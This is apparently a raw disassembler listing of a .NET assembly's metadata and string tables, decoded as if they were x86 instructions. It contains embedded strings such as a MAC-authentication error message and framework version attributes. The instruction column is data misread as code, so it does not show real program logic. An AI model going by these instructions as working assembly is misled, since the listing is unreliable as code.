  40bc6d:	00 6c 00 69          	add    %ch,0x69(%eax,%eax,1)
  40bc71:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40bc75:	00 6d 00             	add    %ch,0x0(%ebp)
  40bc78:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40bc7c:	73 00                	jae    0x40bc7e
  40bc7e:	61                   	popa
  40bc7f:	00 67 00             	add    %ah,0x0(%edi)
  40bc82:	65 00 20             	add    %ah,%gs:(%eax)
  40bc85:	00 61 00             	add    %ah,0x0(%ecx)
  40bc88:	75 00                	jne    0x40bc8a
  40bc8a:	74 00                	je     0x40bc8c
  40bc8c:	68 00 65 00 6e       	push   $0x6e006500
  40bc91:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bc95:	00 63 00             	add    %ah,0x0(%ebx)
  40bc98:	61                   	popa
  40bc99:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bc9d:	00 6f 00             	add    %ch,0x0(%edi)
  40bca0:	6e                   	outsb  %ds:(%esi),(%dx)
  40bca1:	00 20                	add    %ah,(%eax)
  40bca3:	00 63 00             	add    %ah,0x0(%ebx)
  40bca6:	6f                   	outsl  %ds:(%esi),(%dx)
  40bca7:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bcab:	00 20                	add    %ah,(%eax)
  40bcad:	00 28                	add    %ch,(%eax)
  40bcaf:	00 4d 00             	add    %cl,0x0(%ebp)
  40bcb2:	41                   	inc    %ecx
  40bcb3:	00 43 00             	add    %al,0x0(%ebx)
  40bcb6:	29 00                	sub    %eax,(%eax)
  40bcb8:	2e 00 00             	add    %al,%cs:(%eax)
  40bcbb:	05 58 00 32 00       	add    $0x320058,%eax
  40bcc0:	00 0f                	add    %cl,(%edi)
  40bcc2:	7b 00                	jnp    0x40bcc4
  40bcc4:	30 00                	xor    %al,(%eax)
  40bcc6:	3a 00                	cmp    (%eax),%al
  40bcc8:	44                   	inc    %esp
  40bcc9:	00 33                	add    %dh,(%ebx)
  40bccb:	00 7d 00             	add    %bh,0x0(%ebp)
  40bcce:	20 00                	and    %al,(%eax)
  40bcd0:	00 0f                	add    %cl,(%edi)
  40bcd2:	7b 00                	jnp    0x40bcd4
  40bcd4:	30 00                	xor    %al,(%eax)
  40bcd6:	3a 00                	cmp    (%eax),%al
  40bcd8:	58                   	pop    %eax
  40bcd9:	00 32                	add    %dh,(%edx)
  40bcdb:	00 7d 00             	add    %bh,0x0(%ebp)
  40bcde:	20 00                	and    %al,(%eax)
  40bce0:	00 2b                	add    %ch,(%ebx)
  40bce2:	28 00                	sub    %al,(%eax)
  40bce4:	6e                   	outsb  %ds:(%esi),(%dx)
  40bce5:	00 65 00             	add    %ah,0x0(%ebp)
  40bce8:	76 00                	jbe    0x40bcea
  40bcea:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bcee:	20 00                	and    %al,(%eax)
  40bcf0:	75 00                	jne    0x40bcf2
  40bcf2:	73 00                	jae    0x40bcf4
  40bcf4:	65 00 64 00 29       	add    %ah,%gs:0x29(%eax,%eax,1)
  40bcf9:	00 20                	add    %ah,(%eax)
  40bcfb:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40bcff:	00 70 00             	add    %dh,0x0(%eax)
  40bd02:	65 00 20             	add    %ah,%gs:(%eax)
  40bd05:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd08:	63 00                	arpl   %eax,(%eax)
  40bd0a:	31 00                	xor    %eax,(%eax)
  40bd0c:	00 45 28             	add    %al,0x28(%ebp)
  40bd0f:	00 65 00             	add    %ah,0x0(%ebp)
  40bd12:	78 00                	js     0x40bd14
  40bd14:	74 00                	je     0x40bd16
  40bd16:	38 00                	cmp    %al,(%eax)
  40bd18:	2c 00                	sub    $0x0,%al
  40bd1a:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd1e:	74 00                	je     0x40bd20
  40bd20:	31 00                	xor    %eax,(%eax)
  40bd22:	36 00 2c 00          	add    %ch,%ss:(%eax,%eax,1)
  40bd26:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40bd2a:	33 00                	xor    (%eax),%eax
  40bd2c:	32 00                	xor    (%eax),%al
  40bd2e:	29 00                	sub    %eax,(%eax)
  40bd30:	20 00                	and    %al,(%eax)
  40bd32:	74 00                	je     0x40bd34
  40bd34:	79 00                	jns    0x40bd36
  40bd36:	70 00                	jo     0x40bd38
  40bd38:	65 00 20             	add    %ah,%gs:(%eax)
  40bd3b:	00 24 00             	add    %ah,(%eax,%eax,1)
  40bd3e:	63 00                	arpl   %eax,(%eax)
  40bd40:	37                   	aaa
  40bd41:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bd44:	24 00                	and    $0x0,%al
  40bd46:	63 00                	arpl   %eax,(%eax)
  40bd48:	38 00                	cmp    %al,(%eax)
  40bd4a:	2c 00                	sub    $0x0,%al
  40bd4c:	24 00                	and    $0x0,%al
  40bd4e:	63 00                	arpl   %eax,(%eax)
  40bd50:	39 00                	cmp    %eax,(%eax)
  40bd52:	00 00                	add    %al,(%eax)
  40bd54:	ad                   	lods   %ds:(%esi),%eax
  40bd55:	81 9c a1 a7 dc 42 49 	sbbl   $0xd7c07bad,0x4942dca7(%ecx,%eiz,4)
  40bd5c:	ad 7b c0 d7 
  40bd60:	3f                   	aas
  40bd61:	66 74 31             	data16 je 0x40bd95
  40bd64:	00 08                	add    %cl,(%eax)
  40bd66:	b7 7a                	mov    $0x7a,%bh
  40bd68:	5c                   	pop    %esp
  40bd69:	56                   	push   %esi
  40bd6a:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  40bd6d:	89 03                	mov    %eax,(%ebx)
  40bd6f:	00 00                	add    %al,(%eax)
  40bd71:	01 03                	add    %eax,(%ebx)
  40bd73:	20 00                	and    %al,(%eax)
  40bd75:	01 02                	add    %eax,(%edx)
  40bd77:	06                   	push   %es
  40bd78:	0e                   	push   %cs
  40bd79:	03 06                	add    (%esi),%eax
  40bd7b:	12 09                	adc    (%ecx),%cl
  40bd7d:	03 06                	add    (%esi),%eax
  40bd7f:	12 44 03 00          	adc    0x0(%ebx,%eax,1),%al
  40bd83:	00 02                	add    %al,(%edx)
  40bd85:	03 06                	add    (%esi),%eax
  40bd87:	12 0d 03 06 12 11    	adc    0x11120603,%cl
  40bd8d:	03 06                	add    (%esi),%eax
  40bd8f:	1d 05 02 06 0a       	sbb    $0xa060205,%eax
  40bd94:	03 06                	add    (%esi),%eax
  40bd96:	12 15 02 06 02 02    	adc    0x2020602,%dl
  40bd9c:	06                   	push   %es
  40bd9d:	1c 02                	sbb    $0x2,%al
  40bd9f:	06                   	push   %es
  40bda0:	08 04 00             	or     %al,(%eax,%eax,1)
  40bda3:	00 12                	add    %dl,(%edx)
  40bda5:	0d 05 00 01 01       	or     $0x1010005,%eax
  40bdaa:	12 0d 04 00 00 12    	adc    0x12000004,%cl
  40bdb0:	11 05 00 01 01 12    	adc    %eax,0x12010100
  40bdb6:	11 04 00             	adc    %eax,(%eax,%eax,1)
  40bdb9:	00 1d 05 05 00 01    	add    %bl,0x1000505
  40bdbf:	01 1d 05 03 00 00    	add    %ebx,0x305
  40bdc5:	0a 04 00             	or     (%eax,%eax,1),%al
  40bdc8:	01 01                	add    %eax,(%ecx)
  40bdca:	0a 04 00             	or     (%eax,%eax,1),%al
  40bdcd:	00 12                	add    %dl,(%edx)
  40bdcf:	15 05 00 01 01       	adc    $0x1010005,%eax
  40bdd4:	12 15 04 00 01 01    	adc    0x1010004,%dl
  40bdda:	02 03                	add    (%ebx),%al
  40bddc:	00 00                	add    %al,(%eax)
  40bdde:	1c 03                	sbb    $0x3,%al
  40bde0:	00 00                	add    %al,(%eax)
  40bde2:	08 04 00             	or     %al,(%eax,%eax,1)
  40bde5:	01 01                	add    %eax,(%ecx)
  40bde7:	08 04 00             	or     %al,(%eax,%eax,1)
  40bdea:	01 02                	add    %eax,(%edx)
  40bdec:	0e                   	push   %cs
  40bded:	0a 00                	or     (%eax),%al
  40bdef:	04 02                	add    $0x2,%al
  40bdf1:	1c 12                	sbb    $0x12,%al
  40bdf3:	19 12                	sbb    %edx,(%edx)
  40bdf5:	1d 11 21 05 00       	sbb    $0x52111,%eax
  40bdfa:	01 01                	add    %eax,(%ecx)
  40bdfc:	12 25 04 00 01 01    	adc    0x1010004,%ah
  40be02:	1c 04                	sbb    $0x4,%al
  40be04:	08 00                	or     %al,(%eax)
  40be06:	12 0d 04 08 00 12    	adc    0x12000804,%cl
  40be0c:	11 04 08             	adc    %eax,(%eax,%ecx,1)
  40be0f:	00 1d 05 03 08 00    	add    %bl,0x80305
  40be15:	0a 04 08             	or     (%eax,%ecx,1),%al
  40be18:	00 12                	add    %dl,(%edx)
  40be1a:	15 03 08 00 02       	adc    $0x2000803,%eax
  40be1f:	03 08                	add    (%eax),%ecx
  40be21:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40be24:	08 00                	or     %al,(%eax)
  40be26:	08 03                	or     %al,(%ebx)
  40be28:	00 00                	add    %al,(%eax)
  40be2a:	0e                   	push   %cs
  40be2b:	04 00                	add    $0x0,%al
  40be2d:	01 0e                	add    %ecx,(%esi)
  40be2f:	0e                   	push   %cs
  40be30:	08 b0 3f 5f 7f 11    	or     %dh,0x117f5f3f(%eax)
  40be36:	d5 0a                	aad    $0xa
  40be38:	3a 06                	cmp    (%esi),%al
  40be3a:	00 01                	add    %al,(%ecx)
  40be3c:	12 29                	adc    (%ecx),%ch
  40be3e:	12 2d 03 06 12 31    	adc    0x31120603,%ch
  40be44:	03 00                	add    (%eax),%eax
  40be46:	00 18                	add    %bl,(%eax)
  40be48:	07                   	pop    %es
  40be49:	00 03                	add    %al,(%ebx)
  40be4b:	08 18                	or     %bl,(%eax)
  40be4d:	12 35 08 04 00 01    	adc    0x1000408,%dh
  40be53:	18 0e                	sbb    %cl,(%esi)
  40be55:	06                   	push   %es
  40be56:	00 02                	add    %al,(%edx)
  40be58:	02 18                	add    (%eax),%bl
  40be5a:	10 02                	adc    %al,(%edx)
  40be5c:	06                   	push   %es
  40be5d:	00 01                	add    %al,(%ecx)
  40be5f:	11 30                	adc    %esi,(%eax)
  40be61:	11 30                	adc    %esi,(%eax)
  40be63:	06                   	push   %es
  40be64:	00 03                	add    %al,(%ebx)
  40be66:	01 09                	add    %ecx,(%ecx)
  40be68:	09 09                	or     %ecx,(%ecx)
  40be6a:	02 06                	add    (%esi),%al
  40be6c:	09 03                	or     %eax,(%ebx)
  40be6e:	06                   	push   %es
  40be6f:	11 30                	adc    %esi,(%eax)
  40be71:	04 00                	add    $0x0,%al
  40be73:	00 00                	add    %al,(%eax)
  40be75:	80 04 02 00          	addb   $0x0,(%edx,%eax,1)
  40be79:	00 00                	add    %al,(%eax)
  40be7b:	04 01                	add    $0x1,%al
  40be7d:	00 00                	add    %al,(%eax)
  40be7f:	00 06                	add    %al,(%esi)
  40be81:	00 02                	add    %al,(%edx)
  40be83:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40be86:	3d 06 00 02 02       	cmp    $0x2020006,%eax
  40be8b:	0e                   	push   %cs
  40be8c:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40be91:	1d 05 0e 07 06       	sbb    $0x6070e05,%eax
  40be96:	15 12 41 01 12       	adc    $0x12014112,%eax
  40be9b:	60                   	pusha
  40be9c:	05 00 01 01 12       	add    $0x12010100,%eax
  40bea1:	60                   	pusha
  40bea2:	04 00                	add    $0x0,%al
  40bea4:	01 01                	add    %eax,(%ecx)
  40bea6:	0e                   	push   %cs
  40bea7:	18 06                	sbb    %al,(%esi)
  40bea9:	15 12 45 01 15       	adc    $0x15014512,%eax
  40beae:	12 49 0a             	adc    0xa(%ecx),%cl
  40beb1:	12 4d 1c             	adc    0x1c(%ebp),%cl
  40beb4:	12 0d 12 09 0e 1d    	adc    0x1d0e0912,%cl
  40beba:	05 12 31 0e 0e       	add    $0xe0e3112,%eax
  40bebf:	0e                   	push   %cs
  40bec0:	04 20                	add    $0x20,%al
  40bec2:	00 00                	add    %al,(%eax)
  40bec4:	00 04 40             	add    %al,(%eax,%eax,2)
  40bec7:	00 00                	add    %al,(%eax)
  40bec9:	00 04 10             	add    %al,(%eax,%edx,1)
  40becc:	00 00                	add    %al,(%eax)
  40bece:	00 04 20             	add    %al,(%eax,%eiz,1)
  40bed1:	01 01                	add    %eax,(%ecx)
  40bed3:	0e                   	push   %cs
  40bed4:	04 20                	add    $0x20,%al
  40bed6:	01 0e                	add    %ecx,(%esi)
  40bed8:	0e                   	push   %cs
  40bed9:	06                   	push   %es
  40beda:	20 01                	and    %al,(%ecx)
  40bedc:	1d 05 1d 05 07       	sbb    $0x7051d05,%eax
  40bee1:	20 02                	and    %al,(%edx)
  40bee3:	02 1d 05 1d 05 06    	add    0x6051d05,%bl
  40bee9:	00 01                	add    %al,(%ecx)
  40beeb:	1d 05 1d 05 03       	sbb    $0x3051d05,%eax
  40bef0:	06                   	push   %es
  40bef1:	11 50 03             	adc    %edx,0x3(%eax)
  40bef4:	06                   	push   %es
  40bef5:	12 55 05             	adc    0x5(%ebp),%dl
  40bef8:	00 01                	add    %al,(%ecx)
  40befa:	0e                   	push   %cs
  40befb:	1d 05 05 00 01       	sbb    $0x1000505,%eax
  40bf00:	1d 05 0a 05 00       	sbb    $0x50a05,%eax
  40bf05:	01 1d 05 08 05 00    	add    %ebx,0x50805
  40bf0b:	01 1d 05 06 05 00    	add    %ebx,0x50605
  40bf11:	01 1d 05 0d 09 20    	add    %ebx,0x20090d05
  40bf17:	01 01                	add    %eax,(%ecx)
  40bf19:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf1e:	60                   	pusha
  40bf1f:	03 20                	add    (%eax),%esp
  40bf21:	00 1c 03             	add    %bl,(%ebx,%eax,1)
  40bf24:	20 00                	and    %al,(%eax)
  40bf26:	02 03                	add    (%ebx),%al
  40bf28:	28 00                	sub    %al,(%eax)
  40bf2a:	1c 03                	sbb    $0x3,%al
  40bf2c:	06                   	push   %es
  40bf2d:	12 60 0b             	adc    0xb(%eax),%ah
  40bf30:	20 02                	and    %al,(%edx)
  40bf32:	01 12                	add    %edx,(%edx)
  40bf34:	60                   	pusha
  40bf35:	15 12 41 01 12       	adc    $0x12014112,%eax
  40bf3a:	60                   	pusha
  40bf3b:	04 20                	add    $0x20,%al
  40bf3d:	00 12                	add    %dl,(%edx)
  40bf3f:	60                   	pusha
  40bf40:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf45:	0e                   	push   %cs
  40bf46:	05 20 01 12 60       	add    $0x60120120,%eax
  40bf4b:	0a 05 20 01 12 60    	or     0x60120120,%al
  40bf51:	0d 05 20 01 12       	or     $0x12012005,%eax
  40bf56:	60                   	pusha
  40bf57:	08 03                	or     %al,(%ebx)
  40bf59:	20 00                	and    %al,(%eax)
  40bf5b:	08 05 28 01 12 60    	or     %al,0x60120128
  40bf61:	08 03                	or     %al,(%ebx)
  40bf63:	28 00                	sub    %al,(%eax)
  40bf65:	08 03                	or     %al,(%ebx)
  40bf67:	06                   	push   %es
  40bf68:	11 64 03 06          	adc    %esp,0x6(%ebx,%eax,1)
  40bf6c:	12 5c 04 20          	adc    0x20(%esp,%eax,1),%bl
  40bf70:	01 08                	add    %ecx,(%eax)
  40bf72:	0e                   	push   %cs
  40bf73:	05 20 01 01 12       	add    $0x12010120,%eax
  40bf78:	61                   	popa
  40bf79:	04 20                	add    $0x20,%al
  40bf7b:	01 01                	add    %eax,(%ecx)
  40bf7d:	0a 04 20             	or     (%eax,%eiz,1),%al
  40bf80:	01 01                	add    %eax,(%ecx)
  40bf82:	0b 03                	or     (%ebx),%eax
  40bf84:	20 00                	and    %al,(%eax)
  40bf86:	0b 03                	or     (%ebx),%eax
  40bf88:	20 00                	and    %al,(%eax)
  40bf8a:	0a 03                	or     (%ebx),%al
  40bf8c:	20 00                	and    %al,(%eax)
  40bf8e:	0d 05 20 01 01       	or     $0x1012005,%eax
  40bf93:	1d 05 04 20 00       	sbb    $0x200405,%eax
  40bf98:	1d 05 05 20 02       	sbb    $0x2200505,%eax
  40bf9d:	01 0e                	add    %ecx,(%esi)
  40bf9f:	0e                   	push   %cs
  40bfa0:	05 20 02 01 0e       	add    $0xe010220,%eax
  40bfa5:	08 04 20             	or     %al,(%eax,%eiz,1)
  40bfa8:	01 02                	add    %eax,(%edx)
  40bfaa:	0e                   	push   %cs
  40bfab:	03 20                	add    (%eax),%esp
  40bfad:	00 0e                	add    %cl,(%esi)
  40bfaf:	04 20                	add    $0x20,%al
  40bfb1:	01 01                	add    %eax,(%ecx)
  40bfb3:	02 04 20             	add    (%eax,%eiz,1),%al
  40bfb6:	01 01                	add    %eax,(%ecx)
  40bfb8:	0c 04                	or     $0x4,%al
  40bfba:	20 01                	and    %al,(%ecx)
  40bfbc:	01 0d 04 20 00 12    	add    %ecx,0x12002004
  40bfc2:	5c                   	pop    %esp
  40bfc3:	04 20                	add    $0x20,%al
  40bfc5:	00 11                	add    %dl,(%ecx)
  40bfc7:	64 04 20             	fs add $0x20,%al
  40bfca:	00 12                	add    %dl,(%edx)
  40bfcc:	59                   	pop    %ecx
  40bfcd:	03 28                	add    (%eax),%ebp
  40bfcf:	00 0e                	add    %cl,(%esi)
  40bfd1:	03 28                	add    (%eax),%ebp
  40bfd3:	00 0a                	add    %cl,(%edx)
  40bfd5:	03 28                	add    (%eax),%ebp
  40bfd7:	00 0d 04 28 00 12    	add    %cl,0x12002804
  40bfdd:	5c                   	pop    %esp
  40bfde:	04 28                	add    $0x28,%al
  40bfe0:	00 11                	add    %dl,(%ecx)
  40bfe2:	64 04 00             	fs add $0x0,%al
  40bfe5:	00 00                	add    %al,(%eax)
  40bfe7:	00 04 03             	add    %al,(%ebx,%eax,1)
  40bfea:	00 00                	add    %al,(%eax)
  40bfec:	00 04 04             	add    %al,(%esp,%eax,1)
  40bfef:	00 00                	add    %al,(%eax)
  40bff1:	00 04 05 00 00 00 04 	add    %al,0x4000000(,%eax,1)
  40bff8:	06                   	push   %es
  40bff9:	00 00                	add    %al,(%eax)
  40bffb:	00 04 07             	add    %al,(%edi,%eax,1)
  40bffe:	00 00                	add    %al,(%eax)
  40c000:	00 04 08             	add    %al,(%eax,%ecx,1)
  40c003:	00 00                	add    %al,(%eax)
  40c005:	00 04 09             	add    %al,(%ecx,%ecx,1)
  40c008:	00 00                	add    %al,(%eax)
  40c00a:	00 04 0a             	add    %al,(%edx,%ecx,1)
  40c00d:	00 00                	add    %al,(%eax)
  40c00f:	00 04 0b             	add    %al,(%ebx,%ecx,1)
  40c012:	00 00                	add    %al,(%eax)
  40c014:	00 06                	add    %al,(%esi)
  40c016:	00 02                	add    %al,(%edx)
  40c018:	0e                   	push   %cs
  40c019:	12 61 08             	adc    0x8(%ecx),%ah
  40c01c:	05 00 01 0e 12       	add    $0x120e0100,%eax
  40c021:	61                   	popa
  40c022:	06                   	push   %es
  40c023:	00 02                	add    %al,(%edx)
  40c025:	0e                   	push   %cs
  40c026:	05 12 61 05 00       	add    $0x56112,%eax
  40c02b:	01 01                	add    %eax,(%ecx)
  40c02d:	12 61 06             	adc    0x6(%ecx),%ah
  40c030:	00 02                	add    %al,(%edx)
  40c032:	01 12                	add    %edx,(%edx)
  40c034:	61                   	popa
  40c035:	0e                   	push   %cs
  40c036:	07                   	pop    %es
  40c037:	00 02                	add    %al,(%edx)
  40c039:	01 12                	add    %edx,(%edx)
  40c03b:	61                   	popa
  40c03c:	1d 05 06 00 02       	sbb    $0x2000605,%eax
  40c041:	01 12                	add    %edx,(%edx)
  40c043:	61                   	popa
  40c044:	0d 06 00 02 01       	or     $0x1020006,%eax
  40c049:	12 61 0c             	adc    0xc(%ecx),%ah
  40c04c:	06                   	push   %es
  40c04d:	00 02                	add    %al,(%edx)
  40c04f:	01 12                	add    %edx,(%edx)
  40c051:	61                   	popa
  40c052:	02 06                	add    (%esi),%al
  40c054:	00 02                	add    %al,(%edx)
  40c056:	01 12                	add    %edx,(%edx)
  40c058:	61                   	popa
  40c059:	0b 06                	or     (%esi),%eax
  40c05b:	00 02                	add    %al,(%edx)
  40c05d:	01 12                	add    %edx,(%edx)
  40c05f:	61                   	popa
  40c060:	0a 03                	or     (%ebx),%al
  40c062:	06                   	push   %es
  40c063:	11 78 04             	adc    %edi,0x4(%eax)
  40c066:	20 01                	and    %al,(%ecx)
  40c068:	01 08                	add    %ecx,(%eax)
  40c06a:	08 01                	or     %al,(%ecx)
  40c06c:	00 08                	add    %cl,(%eax)
  40c06e:	00 00                	add    %al,(%eax)
  40c070:	00 00                	add    %al,(%eax)
  40c072:	00 1e                	add    %bl,(%esi)
  40c074:	01 00                	add    %eax,(%eax)
  40c076:	01 00                	add    %eax,(%eax)
  40c078:	54                   	push   %esp
  40c079:	02 16                	add    (%esi),%dl
  40c07b:	57                   	push   %edi
  40c07c:	72 61                	jb     0x40c0df
  40c07e:	70 4e                	jo     0x40c0ce
  40c080:	6f                   	outsl  %ds:(%esi),(%dx)
  40c081:	6e                   	outsb  %ds:(%esi),(%dx)
  40c082:	45                   	inc    %ebp
  40c083:	78 63                	js     0x40c0e8
  40c085:	65 70 74             	gs jo  0x40c0fc
  40c088:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c08f:	77 73                	ja     0x40c104
  40c091:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c097:	71 08                	jno    0x40c0a1
  40c099:	01 00                	add    %eax,(%eax)
  40c09b:	02 00                	add    (%eax),%al
  40c09d:	00 00                	add    %al,(%eax)
  40c09f:	00 00                	add    %al,(%eax)
  40c0a1:	05 01 00 00 00       	add    $0x1,%eax
  40c0a6:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40c0a9:	00 07                	add    %al,(%edi)
  40c0ab:	31 2e                	xor    %ebp,(%esi)
  40c0ad:	30 2e                	xor    %ch,(%esi)
  40c0af:	30 2e                	xor    %ch,(%esi)
  40c0b1:	30 00                	xor    %al,(%eax)
  40c0b3:	00 65 01             	add    %ah,0x1(%ebp)
  40c0b6:	00 29                	add    %ch,(%ecx)
  40c0b8:	2e 4e                	cs dec %esi
  40c0ba:	45                   	inc    %ebp
  40c0bb:	54                   	push   %esp
  40c0bc:	46                   	inc    %esi
  40c0bd:	72 61                	jb     0x40c120
  40c0bf:	6d                   	insl   (%dx),%es:(%edi)
  40c0c0:	65 77 6f             	gs ja  0x40c132
  40c0c3:	72 6b                	jb     0x40c130
  40c0c5:	2c 56                	sub    $0x56,%al
  40c0c7:	65 72 73             	gs jb  0x40c13d
  40c0ca:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c0d1:	30 2c 50             	xor    %ch,(%eax,%edx,2)
  40c0d4:	72 6f                	jb     0x40c145
  40c0d6:	66 69 6c 65 3d 43 6c 	imul   $0x6c43,0x3d(%ebp,%eiz,2),%bp
  40c0dd:	69 65 6e 74 01 00 54 	imul   $0x54000174,0x6e(%ebp),%esp
  40c0e4:	0e                   	push   %cs
  40c0e5:	14 46                	adc    $0x46,%al
  40c0e7:	72 61                	jb     0x40c14a
  40c0e9:	6d                   	insl   (%dx),%es:(%edi)
  40c0ea:	65 77 6f             	gs ja  0x40c15c
  40c0ed:	72 6b                	jb     0x40c15a
  40c0ef:	44                   	inc    %esp
  40c0f0:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c0f7:	61                   	popa
  40c0f8:	6d                   	insl   (%dx),%es:(%edi)
  40c0f9:	65 1f                	gs pop %ds
  40c0fb:	2e 4e                	cs dec %esi
  40c0fd:	45                   	inc    %ebp
  40c0fe:	54                   	push   %esp
  40c0ff:	20 46 72             	and    %al,0x72(%esi)
  40c102:	61                   	popa
  40c103:	6d                   	insl   (%dx),%es:(%edi)
  40c104:	65 77 6f             	gs ja  0x40c176
  40c107:	72 6b                	jb     0x40c174
  40c109:	20 34 20             	and    %dh,(%eax,%eiz,1)
  40c10c:	43                   	inc    %ebx
  40c10d:	6c                   	insb   (%dx),%es:(%edi)
  40c10e:	69 65 6e 74 20 50 72 	imul   $0x72502074,0x6e(%ebp),%esp
  40c115:	6f                   	outsl  %ds:(%esi),(%dx)
  40c116:	66 69 6c 65 09 01 00 	imul   $0x1,0x9(%ebp,%eiz,2),%bp
  40c11d:	04 49                	add    $0x49,%al
  40c11f:	74 65                	je     0x40c186
  40c121:	6d                   	insl   (%dx),%es:(%edi)
  40c122:	00 00                	add    %al,(%eax)
  40c124:	03 07                	add    (%edi),%eax
  40c126:	01 08                	add    %ecx,(%eax)
  40c128:	04 00                	add    $0x0,%al
  40c12a:	01 08                	add    %ecx,(%eax)
  40c12c:	0e                   	push   %cs
  40c12d:	03 07                	add    (%edi),%eax
  40c12f:	01 02                	add    %eax,(%edx)
  40c131:	05 00 00 12 80       	add    $0x80120000,%eax
  40c136:	b1 05                	mov    $0x5,%cl
  40c138:	20 01                	and    %al,(%ecx)
  40c13a:	0e                   	push   %cs
  40c13b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40c140:	12 80 b5 05 20 00    	adc    0x2005b5(%eax),%al
  40c146:	12 80 b9 05 20 01    	adc    0x12005b9(%eax),%al
  40c14c:	1d 05 0e 08 20       	sbb    $0x20080e05,%eax
  40c151:	03 02                	add    (%edx),%eax
  40c153:	1d 05 0e 1d 05       	sbb    $0x51d0e05,%eax
  40c158:	14 07                	adc    $0x7,%al
  40c15a:	08 0e                	or     %cl,(%esi)
  40c15c:	08 1d 12 80 c9 08    	or     %bl,0x8c98012
  40c162:	12 80 c9 12 80 cd    	adc    -0x327fed37(%eax),%al
  40c168:	12 80 d1 1d 0e 0c    	adc    0xc0e1dd1(%eax),%al
  40c16e:	20 03                	and    %al,(%ebx)
  40c170:	01 11                	add    %edx,(%ecx)
  40c172:	80 d5 11             	adc    $0x11,%ch
  40c175:	80 d9 11             	sbb    $0x11,%cl
  40c178:	80 dd 05             	sbb    $0x5,%ch
  40c17b:	00 02                	add    %al,(%edx)
  40c17d:	02 0e                	add    (%esi),%cl
  40c17f:	0e                   	push   %cs
  40c180:	06                   	push   %es
  40c181:	20 01                	and    %al,(%ecx)
  40c183:	1d 0e 1d 03 04       	sbb    $0x4031d0e,%eax
  40c188:	20 01                	and    %al,(%ecx)
  40c18a:	08 08                	or     %cl,(%eax)
  40c18c:	07                   	pop    %es
  40c18d:	00 01                	add    %al,(%ecx)
  40c18f:	1d 12 80 c9 0e       	sbb    $0xec98012,%eax
  40c194:	07                   	pop    %es
  40c195:	20 02                	and    %al,(%edx)
  40c197:	01 12                	add    %edx,(%edx)
  40c199:	80 c9 08             	or     $0x8,%cl
  40c19c:	06                   	push   %es
  40c19d:	20 01                	and    %al,(%ecx)
  40c19f:	01 12                	add    %edx,(%edx)
  40c1a1:	80 f1 09             	xor    $0x9,%cl
  40c1a4:	20 02                	and    %al,(%edx)
  40c1a6:	1d 0e 1d 0e 11       	sbb    $0x110e1d0e,%eax
  40c1ab:	80 f5 05             	xor    $0x5,%ch
  40c1ae:	20 02                	and    %al,(%edx)
  40c1b0:	08 08                	or     %cl,(%eax)
  40c1b2:	08 06                	or     %al,(%esi)
  40c1b4:	20 02                	and    %al,(%edx)
  40c1b6:	01 12                	add    %edx,(%edx)
  40c1b8:	0d 02 05 20 02       	or     $0x2200502,%eax
  40c1bd:	01 1c 18             	add    %ebx,(%eax,%ebx,1)
  40c1c0:	09 20                	or     %esp,(%eax)
  40c1c2:	03 01                	add    (%ecx),%eax
  40c1c4:	12 61 02             	adc    0x2(%ecx),%ah
  40c1c7:	12 81 01 05 20 00    	adc    0x200501(%ecx),%al
  40c1cd:	12 81 05 0b 20 04    	adc    0x4200b05(%ecx),%al
  40c1d3:	01 0e                	add    %ecx,(%esi)
  40c1d5:	12 81 09 11 81 0d    	adc    0xd811109(%ecx),%al
  40c1db:	02 09                	add    (%ecx),%cl
  40c1dd:	20 04 01             	and    %al,(%ecx,%eax,1)
  40c1e0:	12 81 15 1c 08 08    	adc    0x8081c15(%ecx),%al
  40c1e6:	0c 20                	or     $0x20,%al
  40c1e8:	05 12 25 1d 05       	add    $0x51d2512,%eax
  40c1ed:	08 08                	or     %cl,(%eax)
  40c1ef:	12 81 19 1c 06 00    	adc    0x61c19(%ecx),%al
  40c1f5:	01 11                	add    %edx,(%ecx)
  40c1f7:	81 21 0e 05 20 01    	andl   $0x120050e,(%ecx)
  40c1fd:	02 12                	add    (%edx),%dl
  40c1ff:	19 04 07             	sbb    %eax,(%edi,%eax,1)
  40c202:	02 08                	add    (%eax),%cl
  40c204:	08 05 20 01 08 12    	or     %al,0x12080120
  40c20a:	25 06 00 02 08       	and    $0x8020006,%eax
  40c20f:	1d 05 08 07 20       	sbb    $0x20070805,%eax
  40c214:	03 08                	add    (%eax),%ecx
  40c216:	1d 05 08 08 06       	sbb    $0x6080805,%eax
  40c21b:	20 01                	and    %al,(%ecx)
  40c21d:	01 12                	add    %edx,(%edx)
  40c21f:	81 29 04 20 01 01    	subl   $0x1012004,(%ecx)
  40c225:	1c 0c                	sbb    $0xc,%al
  40c227:	07                   	pop    %es
  40c228:	06                   	push   %es
  40c229:	1c 02                	sbb    $0x2,%al
  40c22b:	1d 05 12 81 2d       	sbb    $0x2d811205,%eax
  40c230:	08 1d 05 06 00 02    	or     %bl,0x2000605
  40c236:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40c239:	02 07                	add    (%edi),%al
  40c23b:	20 02                	and    %al,(%edx)
  40c23d:	02 08                	add    (%eax),%cl
  40c23f:	11 81 35 07 20 03    	adc    %eax,0x3200735(%ecx)
